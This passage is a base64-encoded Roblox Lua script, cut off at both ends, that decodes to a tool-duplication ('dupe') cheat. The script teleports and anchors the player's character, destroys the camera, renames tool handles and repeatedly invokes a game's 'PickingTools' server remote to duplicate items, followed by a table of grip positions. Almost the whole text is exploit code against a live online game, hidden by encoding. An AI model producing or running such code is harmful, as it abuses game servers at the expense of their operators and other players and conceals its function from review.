nRlckd1aSlTZXRDb3JlKFNlbmROb3RpZmljYXRpb24se1RpdGxlPUR1cGUgU2NyaXB0LFRleHQ9UGxlYXNlIGRvIG5vdCBlcXVpcCBhbnkgdG9vbHMgb3IgdW5lcXVpcCB0b29scyBvciBjbGljayB0b29scyBvbiBpbnZlbnRvcnkuIEl0IHdpbGwgYnJlYWsgdGhlIHNjcmlwdC4sIEJ1dHRvbjEgPSBJIHVuZGVyc3RhbmQgLER1cmF0aW9uPTV9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YWl0KDAuMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKURlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBtPTEsMiBkbyB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGFpZGosYWZoIGluIHBhaXJzKGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBhZmguTmFtZSA9PSB0b29sc2VsY3RlZCA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFmaElzQShUb29sKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWZoLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBhaWVmaGlld2h3ZixkdmpidmogaW4gcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHZqYnZqSXNBKFRvb2wpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHZqYnZqLk5hbWUgPT0gdG9vbHNlbGN0ZWQgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGR2amJ2akRlc3Ryb3koKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0dGp0anV0anV0amp0aixkZHZkdmRzdmRmYnJueXR5dG12ZHYgaW4gcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRkdmR2ZHN2ZGZicm55dHl0bXZkdklzQShUb29sKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRkdmR2ZHN2ZGZicm55dHl0bXZkdi5uYW1lID09IHRvb2xzZWxjdGVkID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZHZkdmRzdmRmYnJueXR5dG12ZHZEZXN0cm95KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgZmluZGluLHRvb2xsZWwgaW4gcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xsZWxJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGVsLk5hbWUgPT0gdG9vbHNlbGN0ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGxmb3VuMiA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgYmFzYyxhaWpmdyBpbiBwYWlycyh0b29sbGVsR2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFpamZ3Lk5hbWUgPT0gSGFuZGxlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWlqZncuTmFtZSA9IEjiIKVh4iClbuIgpWTiIKVs4iClZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxlbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2xsbGxhaGhoaCA9IHRvb2xsZWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBmaWlmaSx0b29sbGxsIGluIHBhaXJzKGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xsbGxJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGxsLk5hbWUgPT0gdG9vbHNlbGN0ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBuYW5hLGpqc2pzaiBpbiBwYWlycyh0b29sbGxsR2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGpqc2pzai5OYW1lID09IEhhbmRsZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgampzanNqLk5hbWUgPSBI4iClYeIgpW7iIKVk4iClbOIgpWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGZmZWwgPSB0b29sbGxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB0b29sbGxsZm91biA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGxsZm91biA9PSB0cnVlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbCB0aGVuICB0b29sbGxsZm91biA9IGZhbHNlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGxsZm91bjIgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9sbGxsYWhoaGgpID09IG5pbCB0aGVuIHRvb2xsbGxmb3VuMiA9IGZhbHNlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9sbGxsYWhoaGgpID09IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YWl0KDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIG09MSwgZHVwZWFtb3QgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG0gPSBkdXBlYW1vdCB0aGVuCiAgICAgICAgICAgICAgICBlbHNlaWYgbSA9PSBkdXBlYW1vdCBvciBtID0gZHVwZWFtb3QgLSAxIHRoZW4KICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gUGlja2luZ1Rvb2xzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMl0gPSB0b29sc2VsY3RlZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwaWNrdG9vbHJlbW90ZUludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja1dhaXRGb3JDaGlsZCh0b29sc2VsY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHNlbGN0ZWRdRmluZEZpcnN0Q2hpbGQoSGFuZGxlKS5OYW1lID0gSOIgpWHiIKVu4iClZOIgpWziIKVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sc2VsY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja0ZpbmRGaXJzdENoaWxkKHRvb2xzZWxjdGVkKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgICAgICAgICBpZiBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkgdW50aWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2xzZWxjdGVkKSA9PSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpID09IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG9sZGNmCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHoseCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgeC5OYW1lID09IHRvb2xzZWxjdGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGFtb3V0aCA9IHoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGR1cGluZyA9IGZhbHNlCiAgIHdhaXQoMSkKCgpsb2NhbCBHcmlwUG9zVGFibGUgPSB7CiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygzLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg2LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMiAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTMgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC00ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtNSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTYgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC03ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtOCAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTkgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMCAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTExICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTIgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMyAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE0ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTUgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTggLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjEgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMyAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg1ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDcgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg4ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoOSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEwICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTEgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMiAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEzICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTQgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE2ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTcgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxOCAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE5ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjAgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIyICwgM